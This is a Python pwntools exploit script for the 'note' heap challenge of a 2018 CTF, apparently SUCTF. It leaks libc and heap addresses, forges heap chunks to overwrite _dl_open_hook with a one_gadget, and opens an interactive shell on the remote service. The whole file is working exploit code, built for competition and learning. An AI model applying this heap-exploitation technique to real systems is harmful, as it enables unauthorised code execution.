#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./note"
os.environ["LD_PRELOAD"]="./libc6_2.24-12ubuntu1_amd64.so"
elf=ELF(pwn_file)
libc=ELF("./libc6_2.24-12ubuntu1_amd64.so")
#libc=elf.libc

heap_address=0
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("pwn.suctf.asuri.org",20003)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address:0x%x"%libc.address)
    log.debug("heap address:0x%x"%heap_address)
    pause()

def add(size,data):
    conn.sendlineafter("Choice>>","1")
    conn.sendlineafter("Size:",str(size))
    conn.sendlineafter("Content:",data)


def show(idx):
    conn.sendlineafter("Choice>>","2")
    conn.sendlineafter("Index:",str(idx))
    conn.recvuntil("Content:")
    return conn.recvline(keepends=False)

def panda():
    conn.sendlineafter("Choice>>","3")
    conn.sendlineafter("This is a Pandora box,are you sure to open it?(yes:1)","1")
    data1=conn.recvline(keepends=False)
    data2=conn.recvline(keepends=False)
    return data1,data2

add(0xd90,"a"*0xd98+p64(0x0141))
add(0x200,"a")
add(0x200,"a")
panda()
data=show(0)
libc.address=u64(data.ljust(8,"\x00"))-0x3bfb58
add(0x300,"a")
heap_address=u64(show(0).ljust(8,"\x00"))-0xec0
f={
    0x28:p64(0x61),
    0x38:p64(heap_address+0xf50),
    0x58:p64(0x401),
    0x68:p64(heap_address+0xef0),
    0x80:p64(libc.address+0xf241b),
    0x88:p64(0x411),
    0x98:p64(heap_address+0xf80),
    0xb8:p64(0x61),
    0xc8:p64(heap_address+0xfa0),
}
add(0x50,fit(f,filler="\x00"))
f={
    0x28:p64(0x401),
    0x38:p64(libc.sym["_dl_open_hook"]-0x10),
    0x48:p64(libc.sym["_dl_open_hook"]-0x20)[:6],
}
add(0x50,fit(f,filler="\x00"))
add(0x50,"a")

conn.sendline("1")
conn.sendline("1234")
conn.interactive()





